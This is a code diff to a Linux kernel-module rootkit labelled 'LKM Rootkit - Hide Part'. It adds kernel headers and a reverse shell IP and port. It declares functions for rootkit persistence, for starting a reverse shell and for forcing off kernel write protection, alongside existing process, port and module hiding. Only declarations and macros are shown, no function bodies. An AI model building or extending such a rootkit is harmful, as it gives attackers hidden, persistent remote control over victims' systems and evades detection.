@@ -15,6 +15,18 @@
 #include <net/sock.h>
 #include <linux/moduleparam.h>
 
+#include <linux/unistd.h>
+#include <linux/file.h>
+#include <asm/uaccess.h>
+#include <asm/processor.h>
+
+#include <asm-generic/barrier.h>
+#include <linux/syscalls.h>
+#include <linux/linkage.h>
+#include <linux/version.h>
+#include <linux/namei.h>
+#include <linux/signal.h>
+
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Eidos");
 MODULE_DESCRIPTION("LKM Rootkit - Hide Part");
@@ -42,6 +54,10 @@ MODULE_DESCRIPTION("LKM Rootkit - Hide Part");
 
 // 进程隐藏所需参数
 #define PROC_HIDE_PATH "/proc"
+
+// reverse shell.
+#define REVERSE_SHELL_IP "127.0.0.1"
+#define REVERSE_SHELL_PORT "5888"
 
 /* -------------------------------------- *
  *              功能模块                   *
@@ -71,6 +87,14 @@ void port_unhide(void);
 void mod_hide(void);
 void mod_unhide(void);
 
+// consistency
+void keep_rootkit(void);
+
+// shellreverse
+int shellreverse_init(void);
+void shellreverse_exit(void);
+
+// protect.
 void write_cr0_forced(unsigned long val);
 void unprotect_memory(void);
 void protect_memory(void);
